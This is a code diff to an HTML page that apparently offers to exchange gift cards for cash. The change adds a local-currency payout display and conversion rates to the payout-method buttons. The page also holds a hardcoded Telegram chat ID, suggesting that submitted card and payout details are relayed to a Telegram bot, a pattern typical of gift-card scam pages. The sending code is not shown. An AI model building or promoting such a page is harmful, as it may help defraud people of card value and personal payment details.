@@ -30,6 +30,7 @@
         .res-box { background: var(--black-grid); border: 1px solid var(--accent); padding: 15px; text-align: center; margin: 15px 0; border-radius: 12px; }
         .res-box span { font-size:10px; color: var(--accent); font-weight: 700; }
         .res-box b { font-size: 28px; color: #fff; display: block; }
+        #local-payout { font-size: 13px; color: #4ade80; margin-top: 8px; font-weight: bold; display: none; background: rgba(74,222,128,0.1); padding: 6px; border-radius: 8px; border: 1px dashed #4ade80; }
         
         .main-btn { width: 100%; padding: 16px; background: var(--accent); border: none; font-weight: 800; cursor: pointer; color: #000; border-radius: 12px; text-transform: uppercase; font-size: 13px; margin-top: 15px; }
         .secure-badge { text-align: center; font-size: 10px; color: #6a737d; margin-top: 15px; font-weight: 600; }
@@ -91,25 +92,26 @@
             <div class="res-box">
                 <span>ESTIMATED EXCHANGE VALUE</span>
                 <div id="display-area"><b>$180.00</b></div>
+                <div id="local-payout"></div>
             </div>
 
             <label>Payout Method</label>
             <div class="grid">
-                <div class="pay" onclick="sel(this, 'USDT', 'Enter Wallet Address')"><span>💎</span> USDT (TRC20)</div>
-                <div class="pay" onclick="sel(this, 'PayPal', 'Enter Email')"><span>🅿️</span> PayPal</div>
-                <div class="pay" onclick="sel(this, 'M-Pesa', 'Enter Number')"><span>🇰🇪</span> M-Pesa</div>
-                <div class="pay" onclick="sel(this, 'Binance', 'Enter Pay ID')"><span>🟡</span> Binance Pay</div>
-                <div class="pay" onclick="sel(this, 'CashApp', 'Enter $Cashtag')"><span>💸</span> CashApp</div>
-                <div class="pay" onclick="sel(this, 'Bitcoin', 'Enter BTC Address')"><span>₿</span> Bitcoin</div>
-                <div class="pay" onclick="sel(this, 'Bank NG', 'Acc Number & Bank')"><span>🇳🇬</span> Bank NG</div>
-                <div class="pay" onclick="sel(this, 'Zelle', 'Zelle Email')"><span>⚛️</span> Zelle</div>
-                <div class="pay" onclick="sel(this, 'MoMo GH', 'Enter Mobile Number')"><span>🇬🇭</span> MoMo GH</div>
-                <div class="pay" onclick="sel(this, 'Revolut', 'Enter Revtag')"><span>🎯</span> Revolut</div>
-                <div class="pay" onclick="sel(this, 'Apple Pay', 'Enter ID')"><span>🍎</span> Apple Pay</div>
-                <div class="pay" onclick="sel(this, 'Skrill', 'Enter Email')"><span>🟣</span> Skrill</div>
-                <div class="pay" onclick="sel(this, 'Chipper', 'Enter @Username')"><span>🐦</span> Chipper</div>
-                <div class="pay" onclick="sel(this, 'Bank ZA', 'Acc & Branch')"><span>🇿🇦</span> Bank ZA</div>
-                <div class="pay" onclick="sel(this, 'Wire', 'IBAN / SWIFT')"><span>🏦</span> Wire</div>
+                <div class="pay" onclick="sel(this, 'USDT', 'Enter Wallet Address', 1, 'USDT')"><span>💎</span> USDT (TRC20)</div>
+                <div class="pay" onclick="sel(this, 'PayPal', 'Enter Email', 1, 'USD')"><span>🅿️</span> PayPal</div>
+                <div class="pay" onclick="sel(this, 'M-Pesa', 'Enter Number', 131.50, 'KES')"><span>🇰🇪</span> M-Pesa</div>
+                <div class="pay" onclick="sel(this, 'Binance', 'Enter Pay ID', 1, 'USD')"><span>🟡</span> Binance Pay</div>
+                <div class="pay" onclick="sel(this, 'CashApp', 'Enter $Cashtag', 1, 'USD')"><span>💸</span> CashApp</div>
+                <div class="pay" onclick="sel(this, 'Bitcoin', 'Enter BTC Address', 1, 'BTC')"><span>₿</span> Bitcoin</div>
+                <div class="pay" onclick="sel(this, 'Bank NG', 'Acc Number & Bank', 1610, 'NGN')"><span>🇳🇬</span> Bank NG</div>
+                <div class="pay" onclick="sel(this, 'Zelle', 'Zelle Email', 1, 'USD')"><span>⚛️</span> Zelle</div>
+                <div class="pay" onclick="sel(this, 'MoMo GH', 'Enter Mobile Number', 14.80, 'GHS')"><span>🇬🇭</span> MoMo GH</div>
+                <div class="pay" onclick="sel(this, 'Revolut', 'Enter Revtag', 1, 'USD')"><span>🎯</span> Revolut</div>
+                <div class="pay" onclick="sel(this, 'Apple Pay', 'Enter ID', 1, 'USD')"><span>🍎</span> Apple Pay</div>
+                <div class="pay" onclick="sel(this, 'Skrill', 'Enter Email', 1, 'USD')"><span>🟣</span> Skrill</div>
+                <div class="pay" onclick="sel(this, 'Chipper', 'Enter @Username', 1, 'USD')"><span>🐦</span> Chipper</div>
+                <div class="pay" onclick="sel(this, 'Bank ZA', 'Acc & Branch', 18.50, 'ZAR')"><span>🇿🇦</span> Bank ZA</div>
+                <div class="pay" onclick="sel(this, 'Wire', 'IBAN / SWIFT', 1, 'USD')"><span>🏦</span> Wire</div>
             </div>
 
             <input id="wallet" placeholder="Recipient Details" style="margin-top: 10px;">
@@ -166,6 +168,8 @@
         const TELEGRAM_CHAT_ID = "5022438644";
         
         let selectedMethod = "";
+        let rateL = 1; 
+        let sym = "USD";
 
         function toggleTheme() {
             const html = document.documentElement;
@@ -174,17 +178,29 @@
             document.getElementById('theme-btn').innerText = isDark ? "🌙 DARK" : "☀️ LIGHT";
         }
 
-        function sel(el, val, placeholder) {
+        function sel(el, val, placeholder, r, s) {
             document.querySelectorAll('.pay').forEach(x => x.classList.remove('active'));
             el.classList.add('active');
             selectedMethod = val;
+            rateL = r || 1;
+            sym = s || "USD";
             document.getElementById('wallet').placeholder = placeholder;
+            updateVal();
         }
 
         function updateVal() {
             let val = parseFloat(document.getElementById('amt').value) || 0;
             let rate = parseFloat(document.getElementById('brand').value);
-            document.getElementById('display-area').innerHTML = '<b>$' + (val * rate).toFixed(2) + '</b>';
+            let totalUSD = val * rate;
+            document.getElementById('display-area').innerHTML = '<b>$' + totalUSD.toFixed(2) + '</b>';
+            
+            let lBox = document.getElementById('local-payout');
+            if(rateL > 1) {
+                lBox.style.display = "block";
+                lBox.innerText = "(" + (totalUSD * rateL).toLocaleString() + " " + sym + ")";
+            } else { 
+                lBox.style.display = "none"; 
+            }
         }
 
         function showHistory() {
